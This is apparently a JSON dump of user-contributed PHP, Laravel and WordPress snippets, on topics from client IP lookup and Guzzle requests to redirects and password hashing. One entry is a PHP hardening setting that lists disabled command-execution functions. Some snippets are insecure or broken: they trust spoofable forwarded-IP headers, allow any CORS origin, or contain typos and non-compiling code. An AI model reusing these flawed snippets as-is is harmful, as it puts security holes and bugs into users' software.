    "description": "<?php echo get_avatar( get_the_author_meta( 'ID' ), 32 ); ?> \n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1402,
    "keyword": null,
    "link": null,
    "title": " get user ip in php",
    "description": "The simplest way to collect the Client/Visitor IP address using PHP is the REMOTE_ADDR. Pass the 'REMOTE_ADDR' in PHP $_SERVER variable. It will return the IP address of the visitor who is currently viewing the webpage.  Get the IP address of the website <?php echo 'User IP Address : '. $_SERVER['REMOTE_ADDR']; ?>    /* I Hope it will help you. Namaste Stay Home Stay Safe */\n$ip = $_SERVER['REMOTE_ADDR'];\nfunction getIp() {     $ip = $_SERVER['REMOTE_ADDR'];       if (!empty($_SERVER['HTTP_CLIENT_IP'])) {         $ip = $_SERVER['HTTP_CLIENT_IP'];     } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {         $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];     }       return $ip; }\n<?php  // Most effective way to get users IP function get_ip_address(){     foreach (array('HTTP_CLIENT_IP', 'HTTP_X_FORWARDED_FOR', 'HTTP_X_FORWARDED', 'HTTP_X_CLUSTER_CLIENT_IP', 'HTTP_FORWARDED_FOR', 'HTTP_FORWARDED', 'REMOTE_ADDR') as $key){         if (array_key_exists($key, $_SERVER) === true){             foreach (explode(',', $_SERVER[$key]) as $ip){                 $ip = trim($ip); // just to be safe                  if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE) !== false){                     return $ip;                 }             }         }     } }  ?>\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1403,
    "keyword": null,
    "link": null,
    "title": " get user ip laravel",
    "description": "To get current user ip in php, laravel    \\Request::ip();  or     $request->ip();\n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1404,
    "keyword": null,
    "link": null,
    "title": " get user meta",
    "description": "<?php \t$meta_data = get_user_meta($user_id, $key, $single); ?>\nglobal $current_user;    get_currentuserinfo();   if ( $current_user ) {     $permission = get_user_meta( $current_user->ID, 'some_meta' , true );           if ( ! empty( $permission ) ) {         // do stuff     } } // works for both array and single values \n",
    "reg_date": "2021-10-12T10:14:24.000Z"
  },
  {
    "id": 1405,
    "keyword": null,
    "link": null,
    "title": " get user symfony",
    "description": "$user = $this->get('security.token_storage')->getToken()->getUser(); $user->getUsername(); \n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1406,
    "keyword": null,
    "link": null,
    "title": " get user with role laravel",
    "description": "$students = User::whereHas(     'roles', function($q){         $q->where('name', 'Teacher');     } )->get(); \n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1407,
    "keyword": null,
    "link": null,
    "title": " get users of specific role laravel role spatie",
    "description": "$user->assignRole('writer');  // You can also assign multiple roles at once $user->assignRole('writer', 'admin'); // or as an array $user->assignRole(['writer', 'admin']); \n$users = User::role('writer')->get(); \n$role->givePermissionTo($permission); $permission->assignRole($role); \n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1408,
    "keyword": null,
    "link": null,
    "title": " get users other than specific role laravel role spatie",
    "description": "$users = User::role('writer')->get(); \nUser::query()->whereHas(\"roles\", function($q){ $q->whereNotIn(\"name\", [\"superadmin\"]); })\n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1409,
    "keyword": null,
    "link": null,
    "title": " get value by today yesterday in laravel",
    "description": "$yesterday = date(\"Y-m-d\", strtotime( '-1 days' ) );\n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1410,
    "keyword": null,
    "link": null,
    "title": " get word between two characters php",
    "description": "  function get_string_between($string, $start, $end){     $string = ' ' . $string;     $ini = strpos($string, $start);     if ($ini == 0) return '';     $ini += strlen($start);     $len = strpos($string, $end, $ini) - $ini;     return substr($string, $ini, $len); }\n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1411,
    "keyword": null,
    "link": null,
    "title": " get wordpress id",
    "description": "echo get_the_ID();\n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1412,
    "keyword": null,
    "link": null,
    "title": " get wordpress page link by id",
    "description": "echo get_page_link($page_id);\n<a href=\"<?php the_permalink(); ?>\">\n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1413,
    "keyword": null,
    "link": null,
    "title": " get words after string  in in php",
    "description": "$string = \"Lorem ipsum dolor sit amet, consectetur adipiscing elit. Nulla felis diam, mattis id elementum eget, ullamcorper et purus.\"; $prefix = \"Nulla\"; $index = strpos($string, $prefix) + strlen($prefix); $result = substr($string, $index); \n",
    "reg_date": "2021-10-12T10:14:25.000Z"
  },
  {
    "id": 1414,
    "keyword": null,
    "link": null,
    "title": " get year in laravel 8",
    "description": "{{ now()->year }}\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1415,
    "keyword": null,
    "link": null,
    "title": " getoriginal laravel",
    "description": "Laravel > 7.x =>  getRawOriginal()    laravel < 7.x   getOriginal()\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1416,
    "keyword": null,
    "link": null,
    "title": " getting last day of next month in php",
    "description": "$lastDay = date('t',strtotime('last month'));  print_r($lastDay);\n$lastDateOfNextMonth =strtotime('last day of next month') ;  $lastDay = date('d/m/Y', $lastDateOfNextMonth);     print_r($lastDay);\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1417,
    "keyword": null,
    "link": null,
    "title": " getting values from url php",
    "description": "$id = $_GET['id']; // OR  $id = $_REQUEST['id'];\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1418,
    "keyword": null,
    "link": null,
    "title": " getttype php",
    "description": "gettype ( mixed $var ) : string  gettype (\"SALUT\") => string gettype (2) => integer       ...etc ...    \"bool\" \"integer\" \"double\" \"array\" \"object\" \"resource\" \"NULL\" \"unknown type\"\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1419,
    "keyword": null,
    "link": null,
    "title": " give custom field name in laravel form validation error message",
    "description": "$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages);\n$this->validate([   'userid' =>'required|min:3|max:100',   'username' =>'required|min:3',   'password' =>'required|max:15|confirmed', ], [], [   'userid' => 'User ID' ]);\n$rules = [         'name' => 'required',         'email' => 'required|email',         'message' => 'required|max:250',     ];      $customMessages = [         'required' => 'The :attribute field is required.'     ];      $this->validate($request, $rules, $customMessages); //@sujay\n$messsages = [               'email.required'=>'You cant leave Email field empty',               'name.required'=>'You cant leave name field empty',               'name.min'=>'The field has to be :min chars long', \t\t\t ];  \t$rules = [               'email'=>'required|unique:content',               'name'=>'required|min:3', \t\t\t];  $validator = Validator::make($request, $rules,$messsages);\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1420,
    "keyword": null,
    "link": null,
    "title": " global laravel request()",
    "description": "request()->field_name\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1421,
    "keyword": null,
    "link": null,
    "title": " google client php get inbox messages",
    "description": "        $optParams = [];         $optParams['maxResults'] = 5; // Return Only 5 Messages         $optParams['labelIds'] = 'INBOX'; // Only show messages in Inbox         $messages = $service->users_messages->listUsersMessages('me',$optParams);         $list = $messages->getMessages();         $messageId = $list[0]->getId(); // Grab first Message           $optParamsGet = [];         $optParamsGet['format'] = 'full'; // Display message in payload         $message = $service->users_messages->get('me',$messageId,$optParamsGet);         $messagePayload = $message->getPayload();         $headers = $message->getPayload()->getHeaders();         $parts = $message->getPayload()->getParts();          $body = $parts[0]['body'];         $rawData = $body->data;         $sanitizedData = strtr($rawData,'-_', '+/');         $decodedMessage = base64_decode($sanitizedData);          var_dump($decodedMessage); \n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1422,
    "keyword": null,
    "link": null,
    "title": " google panel with info name",
    "description": "THERE SHOULD BE A KNOWLEDGE PANEL HERE!\n",
    "reg_date": "2021-10-12T10:14:26.000Z"
  },
  {
    "id": 1423,
    "keyword": null,
    "link": null,
    "title": " google translate api php",
    "description": "<?php     $apiKey = '<paste your API key here>';     $url = 'https://www.googleapis.com/language/translate/v2/languages?key=' . $apiKey;      $handle = curl_init($url);     curl_setopt($handle, CURLOPT_RETURNTRANSFER, true);     //We want the result to be saved into variable, not printed out     $response = curl_exec($handle);                              curl_close($handle);      print_r(json_decode($response, true)); ?>\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1424,
    "keyword": null,
    "link": null,
    "title": " greater than or equal to in php",
    "description": "// Greater than or equal to comparison operator:  >= if ($someInt >= $otherInt) {   // Do your logic ;) }\nGreater than or equal to comparison operator:  >=\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1425,
    "keyword": null,
    "link": null,
    "title": " grenerating random text color for text for image php",
    "description": "$im     =  imagecreatetruecolor(800,400); function color_generator($im){   $color = imagecolorallocate($im,rand(0,500),rand(0,500),rand(0,500));   return $color; } $color = color_generator($im);\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1426,
    "keyword": null,
    "link": null,
    "title": " grep only in php files",
    "description": "grep -r -i --include=\\*.php 'searchterm' ./ \n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1427,
    "keyword": null,
    "link": null,
    "title": " group array php by key",
    "description": "  private function group_by($array, $key) {       $return = array();              foreach($array as $val) {           $return[$val->$key][] = $val;  \t  //  ou para gettype($val) = array \t  //  $return[$val[$key]][] = $val;        }       return $return;   }\n$arrRoom[] = array(\"RoomCode\" => \"Deluxe\",                     \"Rates\" => array ( array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 100)                     )); $arrRoom[] = array(\"RoomCode\" => \"Standard\",                     \"Rates\" => array ( array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 100)                                             ));                     $arrRoom[] = array(\"RoomCode\" => \"Deluxe\",                     \"Rates\" => array (array(                         \"BoardCode\" => \"RO\",                         \"Price\" => 200)                     ));  foreach($arrRoom as $room) {         foreach($room['Rates'] as $rates)     {                 $nRooms[$room['RoomCode']][$rates['BoardCode']][] = array(\"RoomCode\" => $room['RoomCode'],                                                             \"MealCode\" => $rates['BoardCode'],                                                             \"Price\" => $rates['Price']);     } } echo \"\\n ==== Output in Json Format ==== \\n\"; {     \"Deluxe\": {         \"RO\": [             {                 \"RoomCode\": \"Deluxe\",                 \"MealCode\": \"RO\",                 \"Price\": 100             },             {                 \"RoomCode\": \"Deluxe\",                 \"MealCode\": \"RO\",                 \"Price\": 200             }         ]     },     \"Standard\": {         \"RO\": [             {                 \"RoomCode\": \"Standard\",                 \"MealCode\": \"RO\",                 \"Price\": 100             }         ]     } }\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1428,
    "keyword": null,
    "link": null,
    "title": " group by codeigniter 3",
    "description": "$this->db->group_by(array(\"title\", \"date\"));   // Produces: GROUP BY title, date\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1429,
    "keyword": null,
    "link": null,
    "title": " group by laravel",
    "description": "$user_info = DB::table('usermetas')                  ->select('browser', DB::raw('count(*) as total'))                  ->groupBy('browser')                  ->get();\nYou can use unique('field_name'); instead of groupBy('field_name'); /**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get()                             ->unique('sender_id');        dd($messages); }\n DB::table('user')->where('email', $userEmail)->update(array('member_type' => $plan));   \n$groupedSalesCampaign = Order::with('Campaign')             ->where('isapproved','=','Y')             ->groupBy('campaign_id')             ->orderBy(DB::raw('COUNT(id)','desc'))             ->get(array(DB::raw('COUNT(id) as totalsales'),'campaign_id'));\n//If You want the latest id of records then you can use unique() after get(), //don't use group by if you use groupBy  //then you lose your control from id. I hope this is useful for you  myModel::select('id','purch','name','prcvalue')   ->where('purch','=','10234')   ->orderBy('prcvalue','DESC')   ->get()   ->unique('name'); \n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1430,
    "keyword": null,
    "link": null,
    "title": " group concat laravel",
    "description": "$assignment_details = $assignment->raw_plan()                                 ->select('raw_plans.*', DB::raw('group_concat(name) as names'))                                 ->where('assignment_id', 1)                                 ->groupBy('flag')                                 ->get();\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1431,
    "keyword": null,
    "link": null,
    "title": " group concat mysql limit issue",
    "description": "DB::statement('SET GLOBAL group_concat_max_len = 1000000');\n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1432,
    "keyword": null,
    "link": null,
    "title": " group routes in laravel",
    "description": "Route::group(['prefix'=>'accounts','as'=>'account.'], function(){     Route::get('/', 'AccountController@index')->name('index');     Route::get('connect', 'AccountController@connect')->name('connect'); });  Route::group(['prefix'=>'quotes','as'=>'quote.'], function(){     Route::get('/', 'QuoteController@index')->name('index');     Route::get('connect', 'QuoteController@create')->name('create'); });\nRoute::middleware(['first', 'second'])->group(function () {     Route::get('/', function () {         // Uses first & second middleware...     });      Route::get('/user/profile', function () {         // Uses first & second middleware...     }); });\nRoute::group(['prefix' => 'admin'], function () {     Route::get('users', function ()    {         // Matches The \"/admin/users\" URL     }); });\nRoute::prefix('admin')->group(function () {     Route::get('/users', function () {         // Matches The \"/admin/users\" URL     }); });\nRoute::group(['prefix' => 'post', 'middleware' => ['auth']], function(){         Route::get('all','Controller@post');         Route::get('user','Controller@post');     }) \nRoute::get('/novanoticia', 'HomeController@getNovaNoticia')->name('route_name'); \n",
    "reg_date": "2021-10-12T10:14:27.000Z"
  },
  {
    "id": 1433,
    "keyword": null,
    "link": null,
    "title": " groupby in laravel",
    "description": "$user_info = DB::table('usermetas')                  ->select('browser', DB::raw('count(*) as total'))                  ->groupBy('browser')                  ->get();\nYou can use unique('field_name'); instead of groupBy('field_name'); /**  * Show the application dashboard.  *  * @return \\Illuminate\\Http\\Response  */ public function index() {     $messages = Message::select(\"*\")                             ->where('receiver_id',$id)                             ->orderBy('created_at', 'desc')                             ->get()                             ->unique('sender_id');        dd($messages); }\n//If You want the latest id of records then you can use unique() after get(), //don't use group by if you use groupBy  //then you lose your control from id. I hope this is useful for you  myModel::select('id','purch','name','prcvalue')   ->where('purch','=','10234')   ->orderBy('prcvalue','DESC')   ->get()   ->unique('name'); \n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1434,
    "keyword": null,
    "link": null,
    "title": " groupby in laravel with count",
    "description": "$user_info = Usermeta::groupBy('browser')->select('browser', DB::raw('count(*) as total'))->get(); \n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1435,
    "keyword": null,
    "link": null,
    "title": " guzzle bearer token",
    "description": "$newresponse = $basicauth->request(     'GET',     'api/1/curriculum',     ['debug'   => true],      ['headers' =>          [             'Authorization' => \"Bearer {$acceso->access_token}\"         ]     ] )->getBody()->getContents();\n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1436,
    "keyword": null,
    "link": null,
    "title": " guzzle header authorization",
    "description": "public function __construct()     {         $this->client = new Client();         $this->sms_gate_url = config('app.sms_gate.url');         $this->sms_gate_username = config('app.sms_gate.username');         $this->sms_gate_password = config('app.sms_gate.password');     }   public function sendSms(string $phone, string $message)     {         try {             $this->client->post($this->sms_gate_url . 'send', [                 'auth' => [$this->sms_gate_username, $this->sms_gate_password],                  'json' => [                     \"messages\" => [                         [                             \"recipient\" => $phone,                             \"message-id\" => \"itrust\" . strval(time()),                              \"sms\" => [                                 \"originator\" => \"3700\",                                 \"content\" => [                                     \"text\" => $message                                 ]                             ]                         ]                     ]                 ]             ]);         } catch (\\Exception $ex) {             Log::error($ex);         }     }\n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1437,
    "keyword": null,
    "link": null,
    "title": " guzzle http try catch",
    "description": "try {     /**      * We use Guzzle to make an HTTP request somewhere in the      * following theMethodMayThrowException().      */     $result = theMethodMayThrowException(); } catch (\\GuzzleHttp\\Exception\\RequestException $e) {     /**      * Here we actually catch the instance of GuzzleHttp\\Psr7\\Response      * (find it in ./vendor/guzzlehttp/psr7/src/Response.php) with all      * its own and its 'Message' trait's methods. See more explanations below.      *      * So you can have: HTTP status code, message, headers and body.      * Just check the exception object has the response before.      */     if ($e->hasResponse()) {         $response = $e->getResponse();         var_dump($response->getStatusCode()); // HTTP status code;         var_dump($response->getReasonPhrase()); // Response message;         var_dump((string) $response->getBody()); // Body, normally it is JSON;         var_dump(json_decode((string) $response->getBody())); // Body as the decoded JSON;         var_dump($response->getHeaders()); // Headers array;         var_dump($response->hasHeader('Content-Type')); // Is the header presented?         var_dump($response->getHeader('Content-Type')[0]); // Concrete header value;     } } // process $result etc. ... \nuse GuzzleHttp\\Client; use GuzzleHttp\\Exception\\RequestException; use GuzzleHttp\\Exception\\ConnectException;  $client = new Client();  try{ \t$response = $client->request('GET', 'http://github.com'); } catch (ConnectException $e) { \t// Connection exceptions are not caught by RequestException \techo \"Internet, DNS, or other connection error\\n\";     die; } catch (RequestException $e) { \techo \"Request Exception\\n\";     die; } // deal with your $reponse here\n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1438,
    "keyword": null,
    "link": null,
    "title": " guzzle post request with data",
    "description": "$response = $client->request('POST', 'http://httpbin.org/post', [     'form_params' => [         'field_name' => 'abc',         'other_field' => '123',         'nested_field' => [             'nested' => 'hello'         ]     ] ]); \n$response = $client->request('POST', 'http://www.example.com/files/post', [     'multipart' => [         [             'name'     => 'file_name',             'contents' => fopen('/path/to/file', 'r')         ],         [             'name'     => 'csv_header',             'contents' => 'First Name, Last Name, Username',             'filename' => 'csv_header.csv'         ]     ] ]); \n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1439,
    "keyword": null,
    "link": null,
    "title": " guzzlehttp php basic auth",
    "description": "$client = new GuzzleHttp\\Client(); $res = $client->request('GET', 'https://api.github.com/user', [     'auth' => ['user', 'pass'] ]);\n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1440,
    "keyword": null,
    "link": null,
    "title": " guzzlehttp post json example",
    "description": "use GuzzleHttp\\Client;  $client = new Client();  $response = $client->post('url', [     GuzzleHttp\\RequestOptions::JSON => ['foo' => 'bar'] // or 'json' => [...] ]);\n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1441,
    "keyword": null,
    "link": null,
    "title": " h:i:s explode in php by \":\"",
    "description": "$colors  = \"red,blue,green,orange\"; $colorsArray = explode(\",\", $colors);\n$duartion = explode(\":\",\"12:23:34\"); $duration_hour = $duration[0]; $duration_minute = $duration[1]; $duration_second = $duration[2];    echo $duration_hour.\" \".$duration_minute.\" \".$duration_second;\n <?php // Example 1 $pizza  = \"piece1 piece2 piece3 piece4 piece5 piece6\"; $pieces = explode(\" \", $pizza); echo $pieces[0]; // piece1 echo $pieces[1]; // piece2  // Example 2 $data = \"foo:*:1023:1000::/home/foo:/bin/sh\"; list($user, $pass, $uid, $gid, $gecos, $home, $shell) = explode(\":\", $data); echo $user; // foo echo $pass; // *  ?>  \n",
    "reg_date": "2021-10-12T10:14:28.000Z"
  },
  {
    "id": 1442,
    "keyword": null,
    "link": null,
    "title": " hacer array php stack overflow",
    "description": "<?php include_once\"arrays1.php\"; ?> <!doctype hmtl> <html> <body>     <?php       $a=array(3,5,4,890);  $respuesta=imprimirArrays($a);  echo $respuesta;/*linea 11 donde esta el error*/     ?> </body> </html> \n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1443,
    "keyword": null,
    "link": null,
    "title": " hardening PHP7",
    "description": "allow_url_fopen=Off;  allow_url_include=Off; disable_functions=exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source\n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1444,
    "keyword": null,
    "link": null,
    "title": " hasAny cakephp",
    "description": "// check same schoolcode. $conditions = array( 'School.school_code' => $data['School']['school_code'], );  if ($this->School->hasAny($conditions)) { \t$this->Session->setFlash(__('school_code_is_exist'), 'flash/error'); \tgoto load_data; }\n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1445,
    "keyword": null,
    "link": null,
    "title": " has many through laravel",
    "description": "<?php  namespace App;  use Illuminate\\Database\\Eloquent\\Model;  class Mechanic extends Model {     /**      * Get the car's owner.      */     public function carOwner()     {         return $this->hasOneThrough('App\\Owner', 'App\\Car');     } }\nclass Country extends Model {     public function posts()     {         return $this->hasManyThrough(             'App\\Post',             'App\\User',             'country_id', // Foreign key on users table...             'user_id', // Foreign key on posts table...             'id', // Local key on countries table...             'id' // Local key on users table...         );     } }  when countries     id - integer     name - string  users     id - integer     country_id - integer     name - string  posts     id - integer     user_id - integer     title - string\n public function comments()  {    return $this->hasMany(Comment::class);  }\n<?php  namespace App\\Models;  use Illuminate\\Database\\Eloquent\\Model;  class Post extends Model {     /**      * Get the comments for the blog post.      */     public function comments()     {         return $this->hasMany('App\\Models\\Comment');     } }\nprojects     id - integer     name - string  environments     id - integer     project_id - integer     name - string  deployments     id - integer     environment_id - integer     commit_hash - string\n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1446,
    "keyword": null,
    "link": null,
    "title": " has password argon2i",
    "description": " <?php  echo password_hash(\"rasmuslerdorf\", PASSWORD_DEFAULT); // hashed version of password \"rasmuslerdorf\" will be printed  ?>  \n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1447,
    "keyword": null,
    "link": null,
    "title": " hash a password php",
    "description": "// To hash the password, use password_hash(\"MySuperSafePassword!\", PASSWORD_DEFAULT)    // To compare hash with plain text, use password_verify(\"MySuperSafePassword!\", $hashed_password)\n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1448,
    "keyword": null,
    "link": null,
    "title": " have rows count acf php",
    "description": "$numrows = count( get_field( 'field_name', 'post_id' ) ); // post_id isn't need but required in some situations\n",
    "reg_date": "2021-10-12T10:14:29.000Z"
  },
  {
    "id": 1449,
    "keyword": null,
    "link": null,
    "title": " header cros orgin using php",
    "description": "<?php header(\"Access-Control-Allow-Origin: *\"); header(\"Access-Control-Allow-Headers: *\"); ...\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1450,
    "keyword": null,
    "link": null,
    "title": " header location in php",
    "description": "<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\n/* This will just redirect you to example.com */  <?php $url = \"https://example.com\"; header(\"Location: $url\");   exit; ?>  /* I hope it will help you. Namaste */\n<?php // This will redirect  to google.com $url = \"https://google.com\"; header(\"Location: $url\");   ?>\nheader( \"refresh:5;url=wherever.php\" ); \n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1451,
    "keyword": null,
    "link": null,
    "title": " header location php",
    "description": "<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\n <html> <?php /* This will give an error. Note the output  * above, which is before the header() call */ header('Location: http://www.example.com/'); exit; ?>  \n<?php // Redirect to mywebsite.com header(\"location:https://mywebsite.com\");   ?>\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1452,
    "keyword": null,
    "link": null,
    "title": " header php location",
    "description": "<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n<?php // This will just redirect you to example.com $url = \"https://example.com\"; header(\"Location: $url\");   ?>\n<?php /* \tThis will redirect  to facebook.com */ $url = \"https://facebook.com.com\"; header(\"Location: $url\");   exit; ?>\n <html> <?php /* This will give an error. Note the output  * above, which is before the header() call */ header('Location: http://www.example.com/'); exit; ?>  \nheader('Location: http://www.example.com/');\nheader ( string $header [, bool $replace = TRUE [, int $http_response_code ]] ) : void\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1453,
    "keyword": null,
    "link": null,
    "title": " header php redirect",
    "description": "//PHP redirect  header(\"Location: https://www.codegrepper.com/my-redirect-page.php\");  die();  \n<?php // This will just redirect you to example.com header(\"Location: https://example.com\");   ?>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?> \n<?php   header('Location: http://www.aaaa/index.php');   exit();\t\t// useless to let script running ?>  <?php   // permanent redirection (default is 302, 303 for most robots)   header('Location: http://www.aaaa/index.php', true, 301);   exit();\t\t// useless to let script running ?>  // or a meta in html header (if html generation is initiated)  <head> \t<meta http-equiv=\"Location\" content=\"http://www.aaaa/index.php\"> </head> // or waits 15s before redirection <head>   \t<meta http-equiv=\"refresh\" content=\"15;URL=http://www.aaaa/index.php\"> </head>  // or via javascript <script> \twindow.location.replace('http://www.aaaa/index.php'); </script>\n< ?php header(\"Location: http://www.redirect.to.url.com/\"); ?>\nheader(\"Location: http://example.com\"); die();\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1454,
    "keyword": null,
    "link": null,
    "title": " header refresh page php",
    "description": "//Refreshes your current page header(\"Refresh:0\"); header(\"Refresh:2\"); // Refreshes after 2 seconds  //If you need to redirect it to another page header(\"Refresh:0; url=page2.php\");\nheader(\"Refresh:0\");\nheader(\"Refresh:0\");   header(\"Refresh:0; url=page2.php\");\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1455,
    "keyword": null,
    "link": null,
    "title": " hello world",
    "description": "class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\nprint(\"Hello World\")\n// Objective-C hello world  #import <Foundation/Foundation.h>  int main(int argc, char * argv[]) {   @autoreleasepool {     NSLog (@\"Hello, World\");   } }\n// I can't believe there is no grepper answer here!  // Here is Java hello world:  public class HelloWorld {     public static void main(String[] args) {         System.out.println(\"Hello, World!\");     } }\n#include <iostream> int main(){ cout << \"Hello World!\"; return 0; }\necho(\"hello world\");\n#include <iostream> std::cout << \"Hello, World!\";\nHello World!\n<p>Hello World </p>\n//This is a simple Hello World program.  public class hello world { \tpublic static void main(Strin[] args) {      \tSystem.out.println(\"Hello World\");      } }\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1456,
    "keyword": null,
    "link": null,
    "title": " hello world in php",
    "description": "<?php     echo \"Hello World\"; ?>\necho \"Hello World\";\necho \"Hello, World!\";\nprint \"Hello World!\";\n<? echo \"Hello world\"; ?>\n<?php   echo \"Hello WOrld\"; ?>\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1457,
    "keyword": null,
    "link": null,
    "title": " hello world php",
    "description": "<?php     echo \"Hello World\"; ?>\necho \"Hello World\";\necho \"Hello, World!\";\nprint \"Hello World!\";\n<?php   echo \"Hello WOrld\"; ?>\n<?php   echo \"Hello World\"; # or:   print \"Hello World\";\n",
    "reg_date": "2021-10-12T10:14:30.000Z"
  },
  {
    "id": 1458,
    "keyword": null,
    "link": null,
    "title": " hex to bin php",
    "description": "$hexadecimal = 'afc758';  $binary = base_convert($hexadecimal, 16, 2);  echo $hexadecimal . ' -> binary value is: ' . $binary;\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1459,
    "keyword": null,
    "link": null,
    "title": " hex to dec php",
    "description": "$hexadecimal = 'afc758';  $decimal = hexdec($hexadecimal);  echo $hexadecimal . ' -> decimal value is: ' . $decimal;\n",
    "reg_date": "2021-10-12T10:14:31.000Z"
  },
  {
    "id": 1460,
    "keyword": null,
    "link": null,
    "title": " hex to rgba php",
